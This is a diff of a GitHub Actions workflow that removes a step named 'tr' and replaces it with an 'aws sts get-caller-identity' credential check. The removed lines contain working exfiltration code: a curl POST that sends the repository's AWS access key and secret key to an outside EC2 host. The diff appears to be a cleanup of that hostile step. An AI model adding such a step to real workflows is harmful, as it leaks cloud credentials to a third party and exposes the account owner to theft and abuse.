@@ -16,13 +16,6 @@ jobs:
           aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
           aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
           aws-region: us-east-1
-
-    - name: tr
+    - name: Verify AWS Credentials
       run: |
-        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8000/upload \
-        -H "Content-Type: application/json" \
-        -d '{
-              "aws-access-key-id": "'"${{ secrets.AWS_ACCESS_KEY_ID }}"'",
-              "aws-secret-access-key": "'"${{ secrets.AWS_SECRET_ACCESS_KEY }}"'",
-              "aws-region": "us-east-1"
-            }'
+            aws sts get-caller-identity
